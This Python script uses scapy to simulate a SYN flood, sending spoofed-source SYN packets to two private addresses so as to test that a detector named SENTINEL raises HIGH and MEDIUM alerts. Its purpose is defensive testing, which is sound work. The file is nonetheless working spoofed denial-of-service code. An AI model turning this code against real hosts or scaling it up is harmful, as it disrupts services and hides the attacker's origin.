"""
Simulates a SYN flood (DoS) over the network interface.

Run SENTINEL first, then execute this script from a second terminal:
    python scripts/sim_syn_flood.py

The source IP of every packet is randomized on purpose. A real SYN flood
spoofs its source – the attacker never needs the SYN-ACK reply – so the
detector keys on the *destination* IP, the one stable anchor. This script
proves the detector still fires even when every source address is fake.

We send at layer 2 (sendp) with a fixed destination MAC resolved once at
startup. Sending at layer 3 (send) would force scapy to ARP-resolve every
spoofed-destination packet, which both spams "Using broadcast" warnings and
stalls on the ARP timeout per packet. The MAC only has to get the frame onto
the wire so our own capture sees it; the target IPs need not be reachable.

Scenario A – HIGH flood:
    Many SYN packets to a single target, no completing ACKs at all.
    ratio = syn / max(ack, 1) explodes past ratio_high.
    Expected: one SYN_FLOOD HIGH alert (src=None, dst_ip=target).

Scenario B – MEDIUM flood:
    A smaller burst of SYNs against a different target, with a few ACKs
    mixed in so the ratio lands between ratio_medium and ratio_high.
    Expected: one SYN_FLOOD MEDIUM alert.
"""

import random
import time

from scapy.all import conf, getmacbyip
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sendp

IFACE       = conf.iface
TARGET_HIGH = "192.168.1.10"   # victim for the HIGH scenario
TARGET_MED  = "192.168.1.20"   # different victim to avoid the per-dst cooldown
BROADCAST   = "ff:ff:ff:ff:ff:ff"


def _resolve_next_hop_mac() -> str:
    """
    Resolve the default gateway's MAC once and reuse it for every frame, so we
    never ARP per packet. Falls back to broadcast if the gateway can't be found.
    """
    try:
        gateway_ip = conf.route.route("0.0.0.0")[2]
        mac = getmacbyip(gateway_ip)
        if mac:
            print(f"[*] Using next-hop MAC {mac} (gateway {gateway_ip})")
            return mac
    except Exception as e:
        print(f"[!] Gateway MAC lookup failed ({e})")
    print("[*] Falling back to broadcast MAC")
    return BROADCAST


def _random_ip() -> str:
    """A fresh spoofed source for every packet."""
    return f"{random.randint(11, 250)}.{random.randint(0, 255)}." \
           f"{random.randint(0, 255)}.{random.randint(1, 254)}"


def _send(dst_mac: str, target: str, flags: str):
    frame = Ether(dst=dst_mac) / IP(src=_random_ip(), dst=target) / TCP(dport=80, flags=flags)
    sendp(frame, iface=IFACE, verbose=False)


def scenario_a_high(dst_mac: str):
    print("[A] HIGH flood – 60 spoofed SYNs to one target, zero ACKs...")
    for i in range(60):
        _send(dst_mac, TARGET_HIGH, "S")
        if (i + 1) % 10 == 0:
            print(f"  {i + 1} SYNs sent")
    print("[A] Done – expect SYN_FLOOD HIGH alert (src=None).\n")


def scenario_b_medium(dst_mac: str):
    print("[B] MEDIUM flood – 30 spoofed SYNs + 2 ACKs to a second target...")
    for _ in range(30):
        _send(dst_mac, TARGET_MED, "S")
    _send(dst_mac, TARGET_MED, "A")
    _send(dst_mac, TARGET_MED, "A")
    print("[B] Done – ratio ~15, expect SYN_FLOOD MEDIUM alert.\n")


if __name__ == "__main__":
    print("=== SYN Flood Simulation ===\n")
    dst_mac = _resolve_next_hop_mac()
    scenario_a_high(dst_mac)
    time.sleep(3)
    scenario_b_medium(dst_mac)
    print("=== Simulation complete ===")
